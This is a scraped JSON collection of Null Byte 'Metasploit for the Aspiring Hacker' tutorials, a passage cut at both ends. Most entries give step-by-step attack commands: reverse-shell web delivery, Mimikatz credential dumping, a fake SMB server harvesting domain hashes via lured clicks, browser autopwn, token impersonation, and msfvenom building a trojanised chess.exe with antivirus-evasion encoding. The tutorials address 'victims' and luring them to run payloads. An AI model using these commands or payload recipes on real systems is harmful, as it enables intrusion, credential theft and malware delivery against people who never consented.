payload.\nmsf > set payload windows/powershell_reverse_tcp\nBefore we start the exploit, set checks the options to see whether we have all of them set properly.\nNow, we can type exploit and Metasploit will start a small web server in the background and generate a command for us to use on the Windows system.\nNext, open a command prompt on the target Windows system and run that command like below.\nWhen you hit enter, that command will open a connection to the attack machine.\nNow, on the attack system, we can check to see whether the session has opened by typing:\nsessions -l\nAs you can see above, we have a session opened with an ID of 1. We can use that session by typing:\nsessions -i 1\nWhere 1 is the ID of the session. If your session ID is different, such as 2, 3, etc., you should use that ID in the command above.\nNow we have a session on the Windows machine. Success! We can now check to see the running processes on the target system by typing:\nPS C: \\Users\\OTW > Get-Process\nNow, that we are connected to the Windows machine's PowerShell, we can run any of the PowerShell \"command-lets\" as well as the most common Linux commands.\nIn a future tutorial, I will show you how to use the PowerSploit modules to gain even more control and access on that Windows machine, so keep coming back, my hacker novitiates!\nJust updated your iPhone? You'll find new features for Podcasts, News, Books, and TV, as well as important security improvements and fresh wallpapers. Find out what's new and changed on your iPhone with the iOS 17.5 update.",
        "category": "Metasploit Basics"
    },
    {
        "title": "Metasploit for the Aspiring Hacker, Part 12 (Web Delivery for Linux or Mac)",
        "link": "https://null-byte.wonderhowto.com/how-to/hack-like-pro-metasploit-for-aspiring-hacker-part-12-web-delivery-for-linux-mac-0168734/",
        "content": "* WonderHowTo\nWelcome back, my budding hackers!\nMetasploit, one of my favorite hacking/pentesting tools, has so many capabilities that even after my many tutorials on it, I have only scratched the surface of it capabilities. For instance, it can be used with Nexpose for vulnerability scanning, with Nmap for port scanning, and with its numerous auxiliary modules, nearly unlimited other hacking related capabilities.\nAmong the exploit modules, a category that we have not addressed are the web delivery exploits. These exploits enable us to open a web server on the attack system and then generate a simple script command that, when executed on the victim system, will open a Meterpreter shell on the target. This web delivery exploit can use Python, PHP, or the Windows PowerShell scripts.\nOf course, it is your job to get the script on the target machine. This means that you will likely need to get physical access to the system or envelope the code into a seemingly innocuous-looking object that the victim will be enticed to execute.\nIn this tutorial, we will exploit a Linux or Mac system. Since both are UNIX-like systems, they both have built-in Python interpreters by default. If we can get the script command generated by this exploit on the target, we can have complete control of the system including keystroke logging, turning on the webcam, recording from the microphone, and reading or deleting any files on the system.\nLet's get started.\nStep 1: Open a Terminal\nThe first step, of course, is to fire up Kali and open a terminal.\nStep 2: Start Metasploit & Load the Exploit\nNext, start Metasploit by typing:\nkali > msfconsole\nThis should open the msfconsole like that below.\nThen we need to load the exploit:\nmsf > use exploit/multi/script/web_delivery\nSet the IP of our attack system:\nmsf > set LHOST 192.168.181.153\nAnd set the port we want to use:\nmsf > set LPORT 4444\nOf course, I am using my private IP address in my lab, but if the target is outside your LAN, you will likely need to use your public IP and then port forward.\nStep 3: Show Options\nNow that we have the exploit loaded and ready to go, let's take a look at the options for this exploit. Type:\nmsf > show options\nIt looks like we have all the options set as we need. Now, let's get a bit more information on this exploit before we proceed. Type:\nAs you can read above, this exploit starts a web server on our attack system and, when the command that is generated is executed on the target system, a payload is downloaded to victim. In addition, this attack does not write to disk, so it should not trigger the antivirus software on the victim's system.\nStep 4: Start the Exploit\nOur next step is to run the exploit. This starts the web server on our attack system and also generates a Python command that we can use to connect to this web server. Before we do that, though, we need to set the target to 0, selecting the Python exploit.\nmsf > set target 0\nNow, we can type exploit:\nmsf > exploit\nNotice the last thing this exploit writes is \"Run the following command on the target machine\" followed by the command we need to use. Copy this command.\nStep 5: Run the Command on the Victim System\nNext, take that command to the victim machine. In this case, I'm using an Ubuntu 14.04 system. You will need to precede the command with sudo as it requires root privileges.\nThen hit Enter. When you return to your Kali system, you can see a Meterpreter has been started on the target system! We own that box!\nInitially, the Meterpreter is running in the background. To bring it to the foreground, we can type:\nmsf > sessions -l\nThis then lists the \"active sessions.\" Notice that this session ID is \"1.\" We then can activate that session by typing:\nmsf > sessions - i 1\nThis then brings the Meterpreter session to the foreground and we get the meterpreter prompt! To control the system, we can run the Meterpreter commands or scripts, although most of the scripts are written for Windows systems.\nKeep coming back, my budding hackers, as we continue to explore the most valuable skills of the 21st century—hacking!\nJust updated your iPhone? You'll find new features for Podcasts, News, Books, and TV, as well as important security improvements and fresh wallpapers. Find out what's new and changed on your iPhone with the iOS 17.5 update.",
        "category": "Metasploit Basics"
    },
    {
        "title": "Metasploit for the Aspiring Hacker, Part 11 (Post-Exploitation with Mimikatz)",
        "link": "https://null-byte.wonderhowto.com/how-to/hack-like-pro-metasploit-for-aspiring-hacker-part-11-post-exploitation-with-mimikatz-0168208/",
        "content": "* WonderHowTo\nWelcome back, my neophyte hackers!\nMetasploit is such a powerful tool that I can only scratch the surface of its capabilities here. As it has developed over the years, it is now possible to use Metasploit for nearly everything from recon to post exploitation to covering your tracks. Given its versatility, every aspiring hacker should have at least a tentative grasp of Metasploit.\nEvery so often, a post-exploitation module comes out that is so powerful that every Metasploit user should be aware of it and learn to use it. Mimikatz is one such modules. It was created by Benjamin Delpy, aka gentilkiwi, who developed it to teach himself C and to explore Windows security. Basically, it is capable of extracting various sets of Windows credentials from memory.\nMimikatz was originally developed as standalone module that we can upload to the target or run locally on the target, but recently, Rapid7 has ported it for Metasploit and made it available as Meterpreter script. The advantage of this is that it will run entirely in memory and will not leave a footprint on the hard drive that might be detected.\nIn this tutorial, we will be using the Metasploit module which is a bit limited in its capabilities, but I promise to do a tutorial soon on the more powerful standalone tool.\nOne other key point before we begin: there are both 32- and 64-bit versions of Mimikatz. Often, Mimikatz will load the 32-bit version if we have used a 32-bit process to compromise the system. If that happens, Mimikatz will be largely non-functional. To avoid this potential problem, use the \"migrate\" command to migrate the Meterpeter to a 64-bit process before loading Mimkatz. In that way, it will load the 64-bit version and you will enjoy all of its amazing capabilities.\nStep 1: Exploit the Target & Get a Meterpreter Payload\nMimikatz is a post-exploitation module, meaning that it can only be used after the target has been exploited. As a result, I will begin this module assuming that you have successfully exploited the target and have the Meterpreter payload installed on the target system. In addition, you will need to have sysadmin privileges on the target for Mimikatz to work. If you exploited the target as a regular user, you can use the getsystem command to escalate privileges.\nmeterpreter > getsystem\nNow that we have \"system\" privileges, we need to load the Mimikatz module.\nmeterpreter > load mimikatz\nNext, let's get a help screen.\nmeterpreter > help mimikatz\nAs you can see, Mimikatz has a number of native commands and a special mimikatz_command to run custom commands.\nBefore we advance, let's check the version of Mimikatz.\nmeterpreter > mimikatz_command -f version\nMetasploit has only ported version 1.0, although Mimikatz is in version 2.0 (watch for my coming tutorial using the standalone version 2.0 of Mimikatz).\nStep 2: Native Commands\nLet's start by looking to see what we can do to the system with the native commands. If we want to retrieve the Kerberos credentials, we simply need to type:\nmeterpreter > kerberos\nWe can retrieve Windows MSV credentials by simply typing:\nmeterpreter > msv\nStep 3: Mimikatz__Command\nMimikatz also enables us to create custom commands. The commands take the following syntax. Please note the double colon (::) between the command type and the command action.\nmimikatz_command -f <type of command>::<command action>\nIf we want to retrieve password hashes from the SAM file, we can type:\nmeterpreter > mimikatzcommand -f samdump::hashes\nOf course, with these hashes, we can then crack them with any of a number of password cracking tools such Cain and Abel, Hashcat, John the Ripper, and others.\nIf we want to get a list of services running on the target system, we can use the command type service combined with the command action list.\nmeterpreter > mimikatz_command -f service::list\nStep 4: Crypto\nMimikatz has a special command type that addresses cryptography and, as a you might expect, it is called crypto. Using this custom command, we can get a list of cryptography providers on the target system.\nmeterpreter > mimikatz_command -f crypto::listProviders\nIf we want to know where the various cryptography stores are located, we can type:\nmeterpreter > mimikatz_command -f crypto::listStores\nMimikatz is just another powerful tool for the penetester/hacker. Before attempting to use Mimkatz, make certain that you are fairly proficient in the use of Metasploit by going through my Metasploit series here on Null Byte. Also, look for my coming tutorial on the standalone Mimikatz 2.0, so keep coming back, my neophyte hackers!\nJust updated your iPhone? You'll find new features for Podcasts, News, Books, and TV, as well as important security improvements and fresh wallpapers. Find out what's new and changed on your iPhone with the iOS 17.5 update.",
        "category": "Metasploit Basics"
    },
    {
        "title": "Metasploit for the Aspiring Hacker, Part 10 (Finding Deleted Webpages)",
        "link": "https://null-byte.wonderhowto.com/how-to/hack-like-pro-metasploit-for-aspiring-hacker-part-10-finding-deleted-webpages-0165555/",
        "content": "Then, let's list the contents of that directory:\nkali > ls -l\nAs you can see, there are six types of modules in Metasploit, as mentioned before. Let's focus our attention on the auxiliary modules.\nStep 2: List the Auxiliary Modules\nFirst, navigate to the auxiliary module directory and list its contents:\nkali > cd auxiliary\nkali > ls -l\nAs you can see, there are numerous subdirectories of auxiliary modules. In an earlier tutorial, I pointed out that there are hundreds of auxiliary modules for DoSing in Metasploit. In this tutorial, we want to work with the scanner modules. Metasploit has scanning modules of just about every type, including Nmap and website vulnerability scanning.\nStep 3: The Wayback Machine\nAs many of you know, recent years have seen an increased emphasis on information security. Webmasters and IT security personnel are more vigilant about what goes onto their website, trying to make certain that information that might be used to compromise their security is not posted.\nIf we go back just a few years, that was not the case. Companies often would post email addresses, passwords, vulnerability scans, network diagrams, etc. on their website, not aware that someone might find these and use them for malicious purposes. Although I still occassional find a company listing email addresses and passwords on their website, this has become much less common.\nFortunately for us, nothing ever disappears from the web. If it's here today, it will be here 20 years from now (keep that in mind when posting on Facebook or other social media sites).\nThe Internet Archive (Archive.org) was established to save free books, movies, music, software, along with all of the old web information via its Wayback Machine tool (which is a reference to an old cartoon where the main characters, Mr. Peabody and Sherman, would travel back in time in a time machine they called the \"WABAC Machine\"). This means that if a company had, at one time, stored email addresses and passwords on their webpages, or Nessus scans, it is still around somewhere on Archive.org.\nStep 4: Use Metasploit to Retrieve Deleted Webpages\nFortunately for us, Metasploit has an auxiliary module that is capable of retrieving all of the old URLs from Archive.org that are stored for a particular domain. Since the Internet Archive's website tool is referred to as the Wayback Machine, Metasploit has a module called enum_wayback, short for \"enumerate wayback\" machine.\nLet's start the Metasploit console and load it:\nkali > msfconsole\nWhen the msfconsole opens, let's load the wayback module by typing:\nmsf > use auxiliary/scanner/http/enum_wayback\nThis module basically has just two parameters to set:\n1. The domain we want to search for on archive.org\n2. The file we want to save the information in\nSince we will be using the SANS.org as our target, let's set the output to a file named sans_wayback:\nmsf > set OUTFILE sans_wayback\nNext, let's set the domain to our favorite IT Security domain:\nmsf > set DOMAIN sans.org\nStep 5: Start the Wayback Machine\nUnlike exploits in Metasploit where we type exploit to start them, auxiliary modules are initiated by typing run instead:\nThis module will now go to Archive.org and begin to retrieve every saved URL of SANS.org over the years. In the case of SANS.org, it is over 96,000 URLs! Since we told this module to store all of the URLs in a file named \"sans_wayback,\" all these URLs are written to this file.\nWhen the module is done running, we can look inside this file by typing:\nkali > more sans_wayback\nWhen we do, we can see that Archive.org has stored the first URL from 1998. With over 90,000 URLs, visual inspection looking for interesting information is not really practical. Fortunately, god gave us the grep command.\nIf we want to find the URLs with emails stored in them, we can type:\nkali > more sans_wayback | grep email\nAs you can see in the screenshot above, there are quite a few URLs pertaining to email. The one I have circled in red looks particularly interesting, email_list.htm.\nIt is not unheard of for companies to put their vulnerability scans on their website for the security and network personnel to view (and the rest of us). As Nessus is the world's most widely used vulnerability scanner, let's see whether we can find it among these old webpages.\nkali > more sans_wayback | grep nessus\nAs you can see above, we have found three webpages with Nessus in them in the \"audit\" directory. Hmmm... that might be interesting... maybe some Nessus scan reports from the past?\nThis approach to finding deleted information is limited to the information in the URL. We could actually take these URLs and view them in our browser at Archive.org to see whether we can find text information on the page that might be useful. Maybe a better approach would be to download the interesting URLs that this module enumerated directly to a hard drive using HTTrack, then do a text search on the entire web content.\nKeep coming back, my greenhorn hackers, as we explore the workings of the hacker's best friend, Metasploit!\nJust updated your iPhone? You'll find new features for Podcasts, News, Books, and TV, as well as important security improvements and fresh wallpapers. Find out what's new and changed on your iPhone with the iOS 17.5 update.\nCover image via Shutterstock",
        "category": "Metasploit Basics"
    },
    {
        "title": "Metasploit for the Aspiring Hacker, Part 9 (How to Install New Modules)",
        "link": "https://null-byte.wonderhowto.com/how-to/hack-like-pro-metasploit-for-aspiring-hacker-part-9-how-install-new-modules-0162503/",
        "content": "* WonderHowTo\nWelcome back, my tenderfoot hackers!\nOne of the issues we often encounter with Metasploit is how to add new modules. Although Rapid7 (Metasploit's owner and developer) periodically updates Metasploit with new exploits, payloads, and other modules, at times, new modules appear that are not added to the Metasploit repository.\nIn addition, when we re-encode a module to obscure its malicious nature with msfvenom or Veil-Evasion, we will often need to re-insert them into Metasploit for use by the framework.\nIn this tutorial, we will look at how to insert a module into Metasploit. In this case, we will be inserting an exploit module that has never been included in the Metasploit Framework, but is available from multiple sources.\nStep 1: Fire Up Kali & Open Msfconsole\nLet's begin, as usual, by firing up Kali, opening a terminal, and starting the Metasploit console by typing:\nkali > msfconsole\nStep 2: Search Joomla on Exploit-DB\nLet's go to one of my favorite places to find new exploits, Exploit Database (exploit-db.com).\nClick on the \"Search\" button in the upper right of the screen, then on \"Advanced search.\" This will open a search window similar to the one shown below. There, type in \"joomla\" in the \"Free Text Window\" and \"metasploit\" in the \"Author\" window. (All exploits developed for Metasploit are categorized with metasploit as the author, no matter who wrote them.) This should pull up all Joomla exploits developed for use in the Metasploit Framework. Joomla is the popular, open-source web application CMS.\nAs we can see, there are three. The first one, \"Joomla Akeeba Kickstart,\" is the newest and may not be included yet in the Metasploit Framework.\nStep 3: Search Joomla in Msfconsole\nLet's go back to our msfconsole and search to see whether that new Joomla exploit has been included. Type:\nmsf > search type:exploit joomla\nAs you can see, there are three exploits in Metasploit as well, but not the \"Joomla Akeeba Kickstart\" exploit we found in Exploit-DB.\nStep 4: Insert the New Exploit in Metasploit\nNow that we have established that this new Metasploit exploit is not in the updated Metasploit, the question becomes, how do we insert it into Metasploit so that we can use it?\nThe first step is to make a copy of the exploit. In this case, I will simply make a copy and paste operation to save it to a text file on the Desktop of Kali.\nGo back to Exploit-DB and click on the \"Joomla Akeeba Kickstart Unserialize Remote Code Execution\" exploit. When you do so, it will open a screen like below that displays the entire exploit.\nLet's copy it and put it into a text editor such as Leafpad and save it to our Desktop. In my case, I used \"joomla_kicktstart.rb\" as the file name. What you name the exploit is not really important, but where you place it is.\nStep 5: Insert It into the Metasploit Modules\nFirst, we need to open another terminal. To load this new module, we will need to create a directory in a format that Metasploit will understand and can read. We can use the mkdir command with the -p switch (create subdirectories as well).\nkali >mkdir -p /root/.msf4/modules/exploits/unix/joomla\nNote that the .msf4 is a hidden directory and will not appear when doing a directory listing unless you use the -a switch, such as ls -al.\nNow that we have created the directory, let's navigate to that directory with the cd command.\nkali > cd /root/.msf4/modules/exploits/unix/joomla\nLastly, we need to move our new exploit to this directory. We can do that with the mv command. Since our exploit is on our Desktop, we need to move it from there to our new directory where Metasploit can use it. We can move it by typing:\nkali > mv /root/Desktop/joomla_kickstart.rb /root/.msf4/modules/exploits/unix/joomla\nStep 6: Test Whether You Can Use It\nNow that we have moved our new exploit to Metasploit, let's test whether we can use it. We will need to restart Metasploit in order for it to load new exploit. When we have a new msf prompt, let's search for our new module by typing:\nmsf > search type:exploit joomla_kickstart\nAs you can see, Metasploit found our new exploit and it is ready to use! Now, let's load it for use with the use command. Type;\nmsf > use exploit/unix/joomla/joomla_kickstart\nOur new exploit loaded successfully and is ready to start using. Finally, let's stake a look to see whether the options fields loaded successfully by typing:\nmsf > show options\nAs you can see in the screenshot above, Metasploit responded with the options we need to set to use this new module. We are ready to begin exploiting Joomla with our new module!\nWe can use this same method to load a new payload, post exploitation, or auxiliary module (with the minor difference that the subdirectory would not be exploits, but rather payloads, etc.).\nKeep coming back, my tenderfoot hackers, as we continue expand our knowledge and capability of the world's most popular exploitation framework.\nJust updated your iPhone? You'll find new features for Podcasts, News, Books, and TV, as well as important security improvements and fresh wallpapers. Find out what's new and changed on your iPhone with the iOS 17.5 update.",
        "category": "Metasploit Basics"
    },
    {
        "title": "Metasploit for the Aspiring Hacker, Part 8 (Setting Up a Fake SMB Server to Capture Domain Passwords)",
        "link": "https://null-byte.wonderhowto.com/how-to/hack-like-pro-metasploit-for-aspiring-hacker-part-8-setting-up-fake-smb-server-capture-domain-passwords-0161500/",
        "content": "* WonderHowTo\nWelcome back, my neophyte hackers!\nIn previous tutorials, we learned how to steal system tokens that we could use to access resources, how to use hashdump to pull password hashes from a local system, and how to grab password hashes from a local system and crack them.\nIn each of these cases, the password hashes were the passwords of the users on the local system and not the domain. If the system is part of a domain (which is the case in most corporations and large institutions), they will likely have their password stored on the domain controller (DC). How would we get the domain passwords without attacking the fortified domain controller?\nOne of the more powerful features built into Metasploit is the ability to set up a fake SMB server. This means that when someone on the network attempts to access the SMB server, their system will need to present their credentials in terms of their domain password hash. Very often, large networks have a system that systematically connects to each machine to check whether they are patched and secure. When it does so, it must present its credentials to each system and this will usually use the admin password. If we are patient, this may be the best strategy.\nIn addition, by setting up this fake SMB server, we may be able to capture domain credentials as users attempt to authenticate against it. We could send the target an embedded UNC path, and when they click on it, we can grab their domain credentials.\nUnlike some of our other Metasploit attacks, this is neither an exploit or a payload. It is an auxiliary module, and is capable of capturing the hash in a format to be broken using either Cain and Abel or John the Ripper.\nStep 1: Fire Up Kali and Start Metasploit\nLet's start by firing up Kali and opening one of my favorite hacking tools, Metasploit, by typing:\nkali > msfconsole\nStep 2: Set Up the SMB Server\nNow that we have Metasploit open, let's set up a fake SMB server. Unlike some of our other Metasploit attacks, this one is neither an exploit or payload, but rather an auxiliary module. We can start it by typing:\nmsf > use auxiliary/server/capture/smb\nNow that we have loaded this module, let's take a look at the options we need to set to use this module.\nmsf >show options\nAs you can see, this module has numerous options, but we can leave the default settings on each of them, with the exception of the file type to store the hashes for cracking.\nNotice, I have highlighted the JOHNPWFILE option above. We also have the CAINPWFILE at the very top. These options allow us to determine the format of the file storing the hashes for cracking by Cain and Abel or John the Ripper. In this tutorial, I'll be using the latter tool.\nTo do so, I simply need to tell this module to \"set\" the JOHNPWFILE to a particular location by typing:\nmsf > set JOHNPWFILE /root/domainhashes\nNow, all that is left to do is \"exploit.\"\nmsf > exploit\nWhen we type \"exploit,\" this module will start a fake SMB server that will store the presented credentials in the /root directory in files beginning with \"johnhashes\".\nStep 3: Share\nNow that our SMB server is running, we need someone to attempt to login to our share. We can do this by sending a UNC link to our share, such as:\nnet use \\\\192.168.1.106 nullbyte\nWhen they click on that link, their domain credentials will be presented to our SMB server and captured as in the screenshot below.\nStep 4: Crack the Hash\nThe final step is to crack the hashes to obtain the password. We need to go to the /root directory to find the saved hash files.\nkali > cd /root\nAs you can see, there are two hashes stored here. Now to crack them, we can use John the Ripper by typing:\nkali > john johnhashes_netlmv2\nWhen we do so, John the Ripper loads the password hash, recognizes the type of hash, and begins cracking it.\nKeep coming back, my neophyte hackers, as we explore the arts and techniques of hacking. If you are new to Null Byte, make sure to go back to the other guides in this Metasploit Basics series, and check out all of the other hacking series we have!\nJust updated your iPhone? You'll find new features for Podcasts, News, Books, and TV, as well as important security improvements and fresh wallpapers. Find out what's new and changed on your iPhone with the iOS 17.5 update.",
        "category": "Metasploit Basics"
    },
    {
        "title": "Metasploit for the Aspiring Hacker, Part 7 (Autopwn)",
        "link": "https://null-byte.wonderhowto.com/how-to/hack-like-pro-metasploit-for-aspiring-hacker-part-7-autopwn-0161068/",
        "content": "* WonderHowTo\nWelcome back, my novice hackers!\nIn this continuing series on Metasploit basics, let's next look at a module that many aspiring hackers find useful—autopwn.\nGenerally, when we are trying to hack a target, we want to know as much as possible about the target through reconnaissance. Then, and only then, can we choose an appropriate exploit. We should know the operating system, the applications, the browser, the version of Java and Flash, etc. It's tedious, but necessary work. Using a Java exploit when a Flash exploit is called for simply won't work and might land you behind bars.\nThe beauty of autopwn is that it relieves you of some of the hard work of reconnaissance. Autopwn will first try to fingerprint the victim's browser, then \"throw\" at it whatever exploits it thinks might work. It makes life quite simple. The downside of autopwn is that it is very noisy and can lead to either detection by the target or crashing the browser, which happens often.\nLet's take a look at it now.\nStep 1: Fire Up Kali & Open Metasploit\nLet's fire up Kali and start Metasploit with the command:\nkali > msfconsole\nStep 2: Use Autopwn\nTo get started with any exploit, generally we start with the use command. Since the autopwn module is located at auxiliary/server/browser_autopwn, we get started by typing:\nmsf> use auxiliary/server/browser_autopwn\nThis will load the module. Then, to get more information on this module, let's type:\nmsf > auxiliary(browser_autopwn) > info\nAs you can see in the screenshots above and below, this provides us with all the information we need to get started, including each of the options and a brief description of the module.\nStep 3: Show and Set Options\nNext, like nearly all the Metasploit modules, we need to ask it to show us the options.\nmsf > show options\nAs you can see, we need to set:\nThe LHOST is the local host. In other words , our Kali attack system. Since mine is at 192.168.1. 106, I type:\nmsf > set LHOST 192.168.1.106\nNow we need to create a URIPATH. This is the URL that we want the exploits to be located at on our malicious server. We can call it anything we want or we could leave it blank and Metasploit will set it to a default string. Since we are trying to entice our victim to click on this link, let's try to make it inviting and use the name of our favorite hacker training site, Null Byte.\nmsf > set URIPATH null_byte\nTo get started, that's all we need to set.\nStep 4: Exploit\nFinally, let's type exploit:\nmsf > exploit\nThis will start the autopwn module. It starts numerous servers and then loads the exploits that may work against that browser. Each one represents a different possible vulnerability in our browser. Be patient as this takes awhile.\nNotice in the middle of the above screenshot that it loaded 20 exploit modules.\nStep 5: Browse to the Server\nNow from a Windows 7 system with Internet Explorer 9, when the target navigates to our webserver at 192.168.1.106:8080/null_byte, they will get this warning from IE:\nBack on our Kali system, autopwn is fingerprinting the browser and trying to determine which of the exploits will work.\nNote in the middle of this screenshot that autopwn is \"responding with 13 exploits.\" It will now begin trying each of those exploits against the browser with the hope that at least one will work.\nStep 6: Check Your Sessions\nFinally, let's go back to our Kali system and see whether any sessions have opened by typing:\nsessions -l\nWhen we do, Metasploit will list all our active sessions. Looks like I only have one.\nTo connect to that meterpreter session, we simply type:\nsessions -i 1\nWhere 1 is the ID of our session from the previous command. (See it to the far left column?) This will then connect me to my meterpreter connection that looks like this:\nmeterpreter >\nThis is my direct connection into the Windows 7 machine. When I type:\nmeterpreter > shell\nit drops me into a Windows command prompt shell like below.\nDepending upon the browser and its configuration, you might get several meterpreter sessions, you might get one like I did, or you might get none. In the worst case, all of the exploits running against the browser can crash the browser.\nAlthough autopwn is a good Metasploit training tool, it is less than stealthy and often will overwhelm the browser with exploits and crash it. Keep coming back, my novice hackers, as we explore the inner workings my favorite hacking tool, Metasploit!\nJust updated your iPhone? You'll find new features for Podcasts, News, Books, and TV, as well as important security improvements and fresh wallpapers. Find out what's new and changed on your iPhone with the iOS 17.5 update.",
        "category": "Metasploit Basics"
    },
    {
        "title": "Metasploit for the Aspiring Hacker, Part 6 (Gaining Access to Tokens)",
        "link": "https://null-byte.wonderhowto.com/how-to/hack-like-pro-metasploit-for-aspiring-hacker-part-6-gaining-access-tokens-0160424/",
        "content": "* WonderHowTo\nWelcome back, my tenderfoot hackers!\nHacker newbies have an inordinate fixation on password cracking. They believe that cracking the password is the only way to gain access to the target account and its privileges. If what we really want is access to a system or other resources, sometimes we can get it without a password. Good examples of this are replay attacks and MitM attacks. Neither requires us to have passwords to have access to the user's resources.\nAnother way to gain access to a user's account, resources, and privileges is through capturing or impersonating the user's tokens.\nAn important concept I want to emphasize here is that of tokens. In Windows, a token is an object that contains the identity and privileges of the user. When a user logs in, their identity is verified by checking their password against the stored, hashed password list and, if it matches, they are allowed in. The system then issues a token to the user that contains their privileges. Whenever the user wants to access a resource or process, the token is presented to determine whether they are permitted access. Obviously, if we can grab or impersonate that token, we can access all of their accounts and resources without having to crack their password!\nIn this tutorial, we will use Metasploit and the Meterpreter to grab an authenticated user's token. There is a script in Metasploit named \"Incognito\" that is capable of grabbing tokens and impersonating them. This script was first developed by security researchers independent of Metasploit, but was then integrated into our beloved Metasploit Framework and is available to anyone using this powerful tool.\nStep 1: Fire Up Kali and Metasploit\nTo start, fire up Kali and start Metasploit by typing:\nkali > msfconsole\nYou will be greeted by a screen like that above. Please note that I have changed the default background in Kali to a less ominous looking image. Yours may look different.\nStep 2: Exploit the System & Get Meterpreter\nNext, exploit the system and get the meterpreter. In this case, I have exploited an unpatched 2003 Server (there are millions of them still around and support has just ended, so they will no longer be receiving patches). Rather than me repeat here how to exploit a system, please check out my past Metasploit tutorials.\nAs you can see in the screenshot below, I have gained a Meterpreter prompt on the target system.\nStep 3: Load the Incognito Module\nIncognito is not loaded into the Meterpreter by default, so we need to load it into the Meterpreter before we can use it.\nmeterpreter > load incognito\nStep 4: List Available Tokens\nNext, we need to view what tokens are available on the system by listing them.\nmeterpreter > list_tokens -u\nAs you can see, I (OTW) have a token on the target system named 23KTARGET\\OTW. Let's see if we can impersonate that token and gain the privileges of OTW.\nStep 5: Impersonate the Token\nAs you might expect, the command to impersonate a token is:\nmeterpreter > impersonate_token 2K3TARGET\\\\OTW\nIt's important to note that in the above command, I used the \"\\\\\" before OTW. The first \"\\\" escapes the second \"\\\" so that the system sees the \"\\\" as a literal and not a special character. If you write this command with a single backslash, it will tell you that the token was \"not found.\"\nIf Incognito can impersonate the token, it responds as in the screenshot above: \"Successfully impersonated user 2K3TARGET\\OTW.\" Now that we have the token of OTW, we can access and use any resources that OTW has privileges to without cracking their password!\nKeep coming back, my tenderfoot hackers, as we continue along our path to your becoming a professional hacker!\nJust updated your iPhone? You'll find new features for Podcasts, News, Books, and TV, as well as important security improvements and fresh wallpapers. Find out what's new and changed on your iPhone with the iOS 17.5 update.",
        "category": "Metasploit Basics"
    },
    {
        "title": "Metasploit for the Aspiring Hacker, Part 5 (Msfvenom)",
        "link": "https://null-byte.wonderhowto.com/how-to/hack-like-pro-metasploit-for-aspiring-hacker-part-5-msfvenom-0159520/",
        "content": "* WonderHowTo\nWelcome back, my hacker novitiates!\nEluding and evading antivirus software and intrusion detection systems is one of the most critical tasks of the hacker. As soon as a new exploit is developed and discovered, the AV and IDS developers build a signature for the attack, which is then likely to be detected and prevented.\nOne obvious way around this problem is to develop your own exploits, and that is what we have begun to do in our Exploit Building series. Another potential method is to change the encoding, thereby changing the signature of the exploit and/or payload.\nPreviously, to re-encode a payload in Metasploit, you had to pipe msfpayload through the msfencode command as shown in this tutorial. Recently, Rapid7, the developers of Metasploit, introduced a new command that takes the place of the clunky combination of msfpayload and msfencode to streamline the process of re-encoding a Metasploit payload. Let's take a look at it in this guide.\nA Quick Note About Re-Encoding Payloads\nRe-encoding a Metasploit payload used to work for evading AV and other security devices, but the people who develop AV software are not dumb. They have now found ways to detect even a re-encoded payload from Metasploit.\nNow, rather than just look for the signature of the payload you have encoded, they simply look for the signature of the template that Metasploit uses to re-encode. In this way, no matter how many different encoding schemes you use, the template is the same and the AV software has its signature.\nDon't fret though, there are still ways to re-encode a payload that are still undetectable by AV software. I will be starting a new series soon on evading AV software where I will demonstrate many of the ways, so stay tuned for that.\nStep 1: Fire Up Kali & Start Metasploit\nLet's start by firing up Kali and opening the msfconsole. You can do that by simply typing \"msfconsole,\" or you can use the GUI and go to Applications -> Kali Linux -> Top 10 Security Tools -> Metasploit Framework. When you do so, you will find yourself in this interactive Metasploit shell.\nStep 2: See the Msfvenom Options\nNow, at the prompt, type \"msfvenom\" to pull up its help page (you can also use the -h switch).\nmsf > msfvenom\nLet's take a look at some of the most important options in this list.\n* -p designates the Metasploit payload we want to use\n* -e designates the encoder we want to use\n* -a designates the architecture we want to use (default is x86)\n* -s designates the maximum size of the payload\n* -i designates the number of iterations with which to encode the payload\n* -x designates a custom executable file to use as a template\nStep 3: List the Encoders\nEncoders are the various algorithms and encoding schemes that Metasploit can use to re-encode the payloads. Metasploit has numerous encoding schemes, and we can look at these by typing:\nmsf > msfvenom -l encoders\nMetasploit will then list all of the available encoders with each's rank and description. Below, I have highlighted the shikata_ga_nai encoder that we used in a previous tutorial. Note that shikata_ga_nai is ranked \"excellent.\"\nStep 4: View the Payload Options\nWe can use msfvenom to check the options that we need to set for any payload similar to \"show options\" in the Metasploit console. The command to check any payload's options is:\nmsf > msfvenom -p <payload name> -o\nSo, if we want to check the options for the windows/meterpreter/reverse_tcp payload, we simply type:\nmsf >msfvenom -p windows/meterpreter/reverse_tcp -0\nWhen we do so, Metasploit responds like below.\nSo, if we want to work with this payload, we now know what options we need to set in the msfvenom command.\nStep 5: Create a Custom Windows Executable\nNow, let's create a custom Windows executable with a custom template. Although we can create a payload without a custom template, we have a better chance of getting past security devices and AV if we use a custom template. In this case, we will use a chess game named \"chess.exe.\" The idea here is that we will embed the meterpreter payload into the chess game and then, when the victim opens the game to play chess, it will open a meterpreter session on our system.\nI have placed the chess game in the /usr/share directory.\nTo create a malicious executable with the windows/meterpreter/reverse_tcp embedded inside, we simply type:\nmsf > msfvenom -p windows/meterpreter/reverse_tcp LHOST= <your local IP> LPORT=<whatever port you want to listen on> -x /usr/share/chess.exe -e x86/shikata_ga_nai -i 200 -f exe >chess.exe\n* -p /windows/meterpreter/reverse_tcp designates the payload we want to embed\n* LHOST designates the local host\n* LPORT designates the port we want to listen on\n* -x designates the template we want to use and the path to it\n* -e x86/shikata_ga_nai designates the encoder we want to use\n* -i 200 represents the number of iterations\n* -f exe designates we want to create an executable (.exe)\n* chess.exe designates the name of the file created\nWhen the victim clicks on the chess.exe file, the meterpreter payload will be activated and will look to make a connection back to your system (LHOST). For the connection to succeed, you will need to open the multi-handler in Metasploit to receive the connection.\nmsf >use exploit/multi/handlermsf > set payload windows/meterpreter/reverse_tcp\nThis new command in Metasploit, msfvenom, can streamline the process of re-encoding and embedding payloads, but is no guarantee for getting past AV software any longer. I will be starting a new series on evading AV software soon with the latest techniques, so keep coming back, my hacker novitiates!\nCover images via Shutterstock (1, 2)",
        "category": "Metasploit Basics"
    },
    {
        "title": "Metasploit for the Aspiring Hacker, Part 4 (Armitage)",
        "link": "https://null-byte.wonderhowto.com/how-to/hack-like-pro-metasploit-for-aspiring-hacker-part-4-armitage-0158945/",
